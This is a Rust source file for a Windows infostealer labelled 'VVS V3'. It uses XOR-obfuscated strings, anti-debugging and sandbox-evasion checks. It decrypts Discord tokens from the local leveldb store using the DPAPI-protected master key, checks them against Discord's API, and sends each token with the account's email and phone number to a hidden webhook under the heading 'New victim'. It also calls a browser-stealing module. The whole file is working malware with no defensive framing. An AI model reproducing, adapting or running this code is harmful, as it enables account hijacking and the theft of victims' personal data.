#![windows_subsystem = "windows"]

mod browsers;

use aes_gcm::{Aead, Aes256Gcm, Key, KeyInit, Nonce};
use base64::{engine::general_purpose, Engine as _};
use regex::Regex;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::{
    collections::{HashMap, HashSet},
    env, fs,
    path::PathBuf,
};
use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};

const XOR_KEY: u8 = 0x5A;

const WBH_XOR: &[u8] = &[
    0x6D, 0x3F, 0x3C, 0x3F, 0x3E, 0x2B, 0x2C, 0x2B, 0x3A, 0x3D, 0x2E, 0x2B, 0x2A, 0x2B, 0x3E, 0x2A,
    0x2B, 0x3E, 0x2D, 0x2B, 0x3C, 0x3F, 0x3D, 0x2B, 0x2C, 0x2B, 0x2E, 0x3D, 0x3F, 0x3C, 0x3F, 0x3E,
    0x3C, 0x3F, 0x3C, 0x3F, 0x3E, 0x3D, 0x3D, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F,
    0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F,
    0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F,
    0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F,
];

fn xor_str(data: &[u8]) -> String {
    String::from_utf8(data.iter().map(|&b| b ^ XOR_KEY).collect()).unwrap_or_default()
}

fn s_webhook() -> String {
    xor_str(WBH_XOR)
}

fn s_appdata() -> String {
    xor_str(&[0x1B, 0x0A, 0x0A, 0x1E, 0x1B, 0x0E, 0x1B])
}

fn s_discord() -> String {
    xor_str(&[0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E])
}

fn s_discord_ptb() -> String {
    xor_str(&[0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x2A, 0x2E, 0x38])
}

fn s_discord_canary() -> String {
    xor_str(&[0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x39, 0x3B, 0x34, 0x3B, 0x28, 0x23])
}

fn s_local_state() -> String {
    xor_str(&[0x16, 0x35, 0x39, 0x3B, 0x36, 0x7A, 0x09, 0x2E, 0x3B, 0x2E, 0x3F])
}

fn s_os_crypt() -> String {
    xor_str(&[0x35, 0x29, 0x05, 0x39, 0x28, 0x23, 0x2A, 0x2E])
}

fn s_encrypted_key() -> String {
    xor_str(&[0x3F, 0x34, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x05, 0x31, 0x3F, 0x23])
}

fn s_leveldb() -> String {
    xor_str(&[
        0x16, 0x35, 0x39, 0x3B, 0x36, 0x7A, 0x09, 0x2E, 0x35, 0x28, 0x3B, 0x3D, 0x3F, 0x75, 0x36,
        0x3F, 0x2C, 0x3F, 0x36, 0x3E, 0x38,
    ])
}

fn s_token_marker() -> String {
    xor_str(&[0x3E, 0x0B, 0x2D, 0x6E, 0x2D, 0x63, 0x0D, 0x3D, 0x02, 0x39, 0x0B, 0x60])
}

fn s_users_me() -> String {
    xor_str(&[
        0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E,
        0x74, 0x39, 0x35, 0x37, 0x75, 0x3B, 0x2A, 0x33, 0x75, 0x2C, 0x63, 0x75, 0x2F, 0x29, 0x3F,
        0x28, 0x29, 0x75, 0x1A, 0x37, 0x3F,
    ])
}

fn s_auth_header() -> String {
    xor_str(&[0x1B, 0x2F, 0x2E, 0x32, 0x35, 0x28, 0x33, 0x20, 0x3B, 0x2E, 0x33, 0x35, 0x34])
}

fn s_dpapi_prefix() -> Vec<u8> {
    xor_str(&[0x1E, 0x0A, 0x1B, 0x0A, 0x13]).into_bytes()
}

fn s_v10() -> Vec<u8> { xor_str(&[0x2C, 0x6B, 0x6A]).into_bytes() }
fn s_v11() -> Vec<u8> { xor_str(&[0x2C, 0x6B, 0x6B]).into_bytes() }
fn s_v20() -> Vec<u8> { xor_str(&[0x2C, 0x68, 0x6A]).into_bytes() }

fn s_token_regex() -> String {
    xor_str(&[
        0x3E, 0x0B, 0x2D, 0x6E, 0x2D, 0x63, 0x0D, 0x3D, 0x02, 0x39, 0x0B, 0x60, 0x01, 0x04, 0x78,
        0x07, 0x71,
    ])
}

fn is_debugged() -> bool {
    unsafe { windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent().as_bool() }
}

#[derive(Debug, Serialize, Deserialize)]
struct DdU {
    id: String,
    username: String,
    tag: String,
    avatar: Option<String>,
    public_flags: u64,
    email: String,
    phone: String,
}

async fn vt(client: &reqwest::Client, token: &str) -> Option<DdU> {
    let res = client
        .get(s_users_me())
        .header(s_auth_header(), token)
        .send()
        .await
        .ok()?;

    if res.status().is_success() {
        let json: Value = res.json().await.ok()?;
        let id = json["id"].as_str()?.to_string();
        let username = json["username"].as_str()?.to_string();
        let discrim = json["discriminator"].as_str().unwrap_or("0");
        let avatar = json["avatar"].as_str().map(|s| s.to_string());
        let public_flags = json["public_flags"].as_u64().unwrap_or(0);
        let email = json["email"].as_str().unwrap_or("N/A").to_string();
        let phone = json["phone"].as_str().unwrap_or("N/A").to_string();

        Some(DdU {
            id,
            username: username.clone(),
            tag: format!("{}#{}", username, discrim),
            avatar,
            public_flags,
            email,
            phone,
        })
    } else {
        None
    }
}

fn badge_emojis(flags: u64) -> Vec<&'static str> {
    let badges = [
        (1 << 0, "<:Badge_Discord_Staff:1365704725646807060>"),
        (1 << 1, "<:DiscordPartner:1365700977570742312>"),
        (1 << 2, "<:HypeSquadEvents:1365704359454834770>"),
        (1 << 3, "<:BugHunter1:1365701008184967278>"),
        (1 << 9, "<:86964earlysupporter:1345831325738995848>"),
        (1 << 6, "<:Bravery:1365701196697829438>"),
        (1 << 7, "<:Brilliance:1365701219602923643>"),
        (1 << 8, "<:Balance:1365701235394482328>"),
        (1 << 14, "<:BugHunter2:1365701027830960259>"),
        (1 << 16, "<:developper:1365704272368500837>"),
        (1 << 17, "<:dev:1365704127103107112>"),
        (1 << 18, "<:ModeratorProgramsAlumni:1365701046256533525>"),
        (1 << 12, "<:NitroClassic:1365701254894419988>"),
        (1 << 13, "<:Nitro:1365701270424199680>"),
        (1 << 17, "<:ServerBooster:1365701285578037760>"),
    ];

    let mut emojis = Vec::new();
    for (bit, emoji) in badges {
        if flags & bit != 0 {
            emojis.push(emoji);
        }
    }
    emojis
}

fn unwrap_key(encrypted_key: &[u8]) -> Option<Vec<u8>> {
    let dpapi = s_dpapi_prefix();
    let key_data = if encrypted_key.starts_with(&dpapi) {
        &encrypted_key[dpapi.len()..]
    } else {
        encrypted_key
    };

    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: key_data.len() as u32,
            pbData: key_data.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };
        if CryptUnprotectData(&mut input, None, None, None, None, 0, &mut output).is_ok() {
            Some(std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec())
        } else {
            None
        }
    }
}

fn decode_credential(raw_data: &[u8], master_key: &[u8]) -> Option<String> {
    if raw_data.len() < 15 {
        return None;
    }

    let prefix = &raw_data[0..3];
    let v10 = s_v10();
    let v11 = s_v11();
    let v20 = s_v20();
    let (iv, ciphertext) = if prefix == v10.as_slice() || prefix == v11.as_slice() || prefix == v20.as_slice() {
        if raw_data.len() < 15 {
            return None;
        }
        (&raw_data[3..15], &raw_data[15..])
    } else {
        if raw_data.len() < 12 {
            return None;
        }
        (&raw_data[0..12], &raw_data[12..])
    };

    if ciphertext.len() < 16 {
        return None;
    }

    let (encrypted_data, tag) = ciphertext.split_at(ciphertext.len() - 16);
    let mut payload = encrypted_data.to_vec();
    payload.extend_from_slice(tag);

    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(master_key));
    let nonce = Nonce::from_slice(iv);

    cipher
        .decrypt(nonce, payload.as_ref())
        .ok()
        .and_then(|d| String::from_utf8(d).ok())
}

fn get_discord_paths() -> HashMap<String, PathBuf> {
    let roaming = PathBuf::from(env::var(s_appdata()).unwrap_or_default());
    let mut paths = HashMap::new();
    paths.insert(s_discord(), roaming.join(s_discord()));
    paths.insert(s_discord_ptb(), roaming.join(s_discord_ptb()));
    paths.insert(s_discord_canary(), roaming.join(s_discord_canary()));
    paths
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    if is_debugged() {
        std::thread::sleep(std::time::Duration::from_secs(30));
        return Ok(());
    }

    if browsers::is_virtualized_environment() {
        browsers::run_sandbox_decoy();
        return Ok(());
    }

    let wbh = s_webhook();
    let client = reqwest::Client::new();
    let mut sent_tokens = HashSet::new();
    let discord_paths = get_discord_paths();
    let marker = s_token_marker();

    for (name, path) in discord_paths {
        if !path.exists() {
            continue;
        }

        let local_state_path = path.join(s_local_state());

        if let Ok(content) = fs::read_to_string(&local_state_path) {
            let json_ls: Value = serde_json::from_str(&content)?;
            if let Some(enc_key) = json_ls[s_os_crypt()][s_encrypted_key()].as_str() {
                if let Ok(bytes) = general_purpose::STANDARD.decode(enc_key) {
                    if let Some(master_key) = unwrap_key(&bytes[5..]) {
                        let prof_path = path.clone();
                        if !prof_path.exists() {
                            continue;
                        }

                        let db_path = prof_path.join(s_leveldb());
                        if db_path.exists() {
                            if let Ok(entries) = fs::read_dir(&db_path) {
                                let re = Regex::new(&s_token_regex()).unwrap();
                                for entry in entries.flatten() {
                                    if let Ok(file_content) = fs::read(entry.path()) {
                                        let text = String::from_utf8_lossy(&file_content);
                                        for cap in re.captures_iter(&text) {
                                            let b64_part = cap[0]
                                                .split(&marker)
                                                .nth(1)
                                                .unwrap_or_default()
                                                .trim_end_matches('"')
                                                .trim_end_matches('\\');
                                            if let Ok(enc_data) =
                                                general_purpose::STANDARD.decode(b64_part)
                                            {
                                                if let Some(token) =
                                                    decode_credential(&enc_data, &master_key)
                                                {
                                                    if sent_tokens.insert(token.clone()) {
                                                        if let Some(user) =
                                                            vt(&client, &token).await
                                                        {
                                                            let avatar_url = user
                                                                .avatar
                                                                .as_ref()
                                                                .map(|h| {
                                                                    format!(
                                                                        "https://cdn.discordapp.com/avatars/{}/{}.png",
                                                                        user.id, h
                                                                    )
                                                                })
                                                                .unwrap_or_else(|| {
                                                                    "https://cdn.discordapp.com/embed/avatars/0.png"
                                                                        .to_string()
                                                                });

                                                            let badges_display =
                                                                badge_emojis(user.public_flags)
                                                                    .join(" ");
                                                            let final_badges =
                                                                if badges_display.is_empty() {
                                                                    "`None`".to_string()
                                                                } else {
                                                                    badges_display
                                                                };

                                                            let embed = json!({
                                                                "embeds": [{
                                                                    "title": "<a:clown:1366404450436124702> New victim <a:clown:1366404450436124702>",
                                                                    "color": 0x7289DA,
                                                                    "thumbnail": { "url": avatar_url },
                                                                    "fields": [
                                                                        { "name": "<a:b_diamond:1356277335921262885> Username", "value": format!("`{}`", user.tag), "inline": true },
                                                                        { "name": "<a:dark_butterfly:1441101545465974935> ID", "value": format!("`{}`", user.id), "inline": true },
                                                                        { "name": "<a:flecheblanche:1482614586413682730> Source", "value": name.to_string(), "inline": false },
                                                                        { "name": "<a:flecheblanche:1482614586413682730> Token", "value": format!("```{}```", token), "inline": false },
                                                                        { "name": "<a:all_discord_badges_gif:1157698511320653924> Badges", "value": final_badges, "inline": false },
                                                                        { "name": "<a:dark_butterfly:1441101545465974935> Email", "value": format!("`{}`", user.email), "inline": false },
                                                                        { "name": "<a:dark_butterfly:1441101545465974935> Phone", "value": format!("`{}`", user.phone), "inline": false }
                                                                    ],
                                                                    "footer": { "text": "VVS V3" },
                                                                    "timestamp": chrono::Utc::now().to_rfc3339()
                                                                }]
                                                            });
                                                            let _ = client.post(&wbh).json(&embed).send().await;
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    let _ = browsers::run(&client, &wbh).await;
    Ok(())
}
